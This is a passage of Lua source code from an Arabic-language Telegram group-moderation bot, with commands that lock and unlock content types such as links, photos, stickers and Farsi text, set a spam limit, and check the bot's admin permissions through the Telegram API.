if aMeRConstructor(msg) then
if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
if DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح تعديل الميديا")  
DevaMeR:del(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
if UnLockText[2] == "الفارسيه" then
if DevaMeR:get(LanZo..'aMeR:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفارسيه")  
DevaMeR:del(LanZo..'aMeR:Lock:Farsi'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفشار")  
DevaMeR:set(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الطائفيه")  
DevaMeR:set(LanZo..'aMeR:Lock:Taf'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكفر")  
DevaMeR:set(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevaMeR:get(LanZo..'aMeR:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفارسيه بالطرد")  
DevaMeR:del(LanZo..'aMeR:Lock:FarsiBan'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if aMeRConstructor(msg) then
if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح البوتات")  
DevaMeR:del(LanZo.."aMeR:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevaMeR:hdel(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevaMeR:get(LanZo..'aMeR:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevaMeR:del(LanZo..'aMeR:Lock:Pin'..msg.chat_id_)
DevaMeR:srem(LanZo.."aMeR:Lock:Pinpin",msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source LanZo     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الدردشه")  
DevaMeR:set(LanZo..'aMeR:Lock:Text'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الاونلاين")  
DevaMeR:set(LanZo..'aMeR:Lock:Inline'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الصور")  
DevaMeR:set(LanZo..'aMeR:Lock:Photo'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الكلايش")  
DevaMeR:set(LanZo..'aMeR:Lock:Spam'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الدخول")  
DevaMeR:set(LanZo..'aMeR:Lock:Join'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفيديو")  
DevaMeR:set(LanZo..'aMeR:Lock:Videos'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل المتحركه")  
DevaMeR:set(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الاغاني")  
DevaMeR:set(LanZo..'aMeR:Lock:Music'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الصوت")  
DevaMeR:set(LanZo..'aMeR:Lock:Voice'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الروابط")  
DevaMeR:set(LanZo..'aMeR:Lock:Links'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل المواقع")  
DevaMeR:set(LanZo..'aMeR:Lock:Location'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل المعرفات")  
DevaMeR:set(LanZo..'aMeR:Lock:Tags'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الملفات")  
DevaMeR:set(LanZo..'aMeR:Lock:Document'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الهاشتاك")  
DevaMeR:set(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الجهات")  
DevaMeR:set(LanZo..'aMeR:Lock:Contact'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '️᥀︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الشبكات")  
DevaMeR:set(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل العربيه")  
DevaMeR:set(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الانكليزيه")  
DevaMeR:set(LanZo..'aMeR:Lock:English'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الملصقات")  
DevaMeR:set(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الماركداون")  
DevaMeR:set(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الاشعارات")  
DevaMeR:set(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التوجيه")  
DevaMeR:set(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_,true)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     Source LanZo     --
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevaMeR:get(LanZo..'aMeR:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الدردشه")  
DevaMeR:del(LanZo..'aMeR:Lock:Text'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevaMeR:get(LanZo..'aMeR:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الصور")  
DevaMeR:del(LanZo..'aMeR:Lock:Photo'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevaMeR:get(LanZo..'aMeR:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevaMeR:del(LanZo..'aMeR:Lock:Spam'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevaMeR:get(LanZo..'aMeR:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الدخول")  
DevaMeR:del(LanZo..'aMeR:Lock:Join'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevaMeR:get(LanZo..'aMeR:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفيديو")  
DevaMeR:del(LanZo..'aMeR:Lock:Videos'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevaMeR:get(LanZo..'aMeR:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الملفات")  
DevaMeR:del(LanZo..'aMeR:Lock:Document'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevaMeR:get(LanZo..'aMeR:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الاونلاين")  
DevaMeR:del(LanZo..'aMeR:Lock:Inline'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevaMeR:get(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الماركداون")  
DevaMeR:del(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevaMeR:get(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح المتحركه")  
DevaMeR:del(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevaMeR:get(LanZo..'aMeR:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الاغاني")  
DevaMeR:del(LanZo..'aMeR:Lock:Music'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevaMeR:get(LanZo..'aMeR:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الصوت")  
DevaMeR:del(LanZo..'aMeR:Lock:Voice'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الروابط")  
DevaMeR:del(LanZo..'aMeR:Lock:Links'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevaMeR:get(LanZo..'aMeR:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح المواقع")  
DevaMeR:del(LanZo..'aMeR:Lock:Location'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح المعرفات")  
DevaMeR:del(LanZo..'aMeR:Lock:Tags'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الهاشتاك")  
DevaMeR:del(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevaMeR:get(LanZo..'aMeR:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الجهات")  
DevaMeR:del(LanZo..'aMeR:Lock:Contact'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الشبكات")  
DevaMeR:del(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح العربيه")  
DevaMeR:del(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الانكليزيه")  
DevaMeR:del(LanZo..'aMeR:Lock:English'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الاشعارات")  
DevaMeR:del(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevaMeR:get(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الملصقات")  
DevaMeR:del(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التوجيه")  
DevaMeR:del(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     Source LanZo     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..msg.chat_id_,"del") DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'aMeR:Lock:Links','aMeR:Lock:Contact','aMeR:Lock:Forwards','aMeR:Lock:Videos','aMeR:Lock:Gifs','aMeR:Lock:EditMsgs','aMeR:Lock:Stickers','aMeR:Lock:Farsi','aMeR:Lock:Spam','aMeR:Lock:WebLinks','aMeR:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevaMeR:set(LanZo..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevaMeR:hdel(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'aMeR:Lock:Links','aMeR:Lock:Contact','aMeR:Lock:Forwards','aMeR:Lock:Videos','aMeR:Lock:Gifs','aMeR:Lock:EditMsgs','aMeR:Lock:Stickers','aMeR:Lock:Farsi','aMeR:Lock:Spam','aMeR:Lock:WebLinks','aMeR:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevaMeR:del(LanZo..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التفليش")  
end
end
--     Source LanZo     --
if text and text:match("^قفل الكل$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevaMeR:del(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_) DevaMeR:del(LanZo..'aMeR:Lock:Taf'..msg.chat_id_) DevaMeR:del(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_) 
DevaMeR:set(LanZo.."aMeR:Lock:Bots"..msg.chat_id_,"del") DevaMeR:hset(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'aMeR:Lock:EditMsgs','aMeR:Lock:Farsi','aMeR:Lock:TagServr','aMeR:Lock:Inline','aMeR:Lock:Photo','aMeR:Lock:Spam','aMeR:Lock:Videos','aMeR:Lock:Gifs','aMeR:Lock:Music','aMeR:Lock:Voice','aMeR:Lock:Links','aMeR:Lock:Location','aMeR:Lock:Tags','aMeR:Lock:Stickers','aMeR:Lock:Markdown','aMeR:Lock:Forwards','aMeR:Lock:Document','aMeR:Lock:Contact','aMeR:Lock:Hashtak','aMeR:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevaMeR:set(LanZo..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevaMeR:set(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_,true) DevaMeR:set(LanZo..'aMeR:Lock:Taf'..msg.chat_id_,true) DevaMeR:set(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_,true) DevaMeR:hdel(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'aMeR:Lock:EditMsgs','aMeR:Lock:Text','aMeR:Lock:Arabic','aMeR:Lock:English','aMeR:Lock:Join','aMeR:Lock:Bots','aMeR:Lock:Farsi','aMeR:Lock:FarsiBan','aMeR:Lock:TagServr','aMeR:Lock:Inline','aMeR:Lock:Photo','aMeR:Lock:Spam','aMeR:Lock:Videos','aMeR:Lock:Gifs','aMeR:Lock:Music','aMeR:Lock:Voice','aMeR:Lock:Links','aMeR:Lock:Location','aMeR:Lock:Tags','aMeR:Lock:Stickers','aMeR:Lock:Markdown','aMeR:Lock:Forwards','aMeR:Lock:Document','aMeR:Lock:Contact','aMeR:Lock:Hashtak','aMeR:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevaMeR:del(LanZo..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح جميع الاوامر")  
end
end
--     Source LanZo     --
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevaMeR:set(LanZo..'aMeR:Spam:Text'..msg.chat_id_,SetSpam)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
--     Source LanZo     --
if Manager(msg) then
if text == "فحص" and ChCheck(msg) or text == "فحص البوت" and ChCheck(msg) then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..LanZo)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
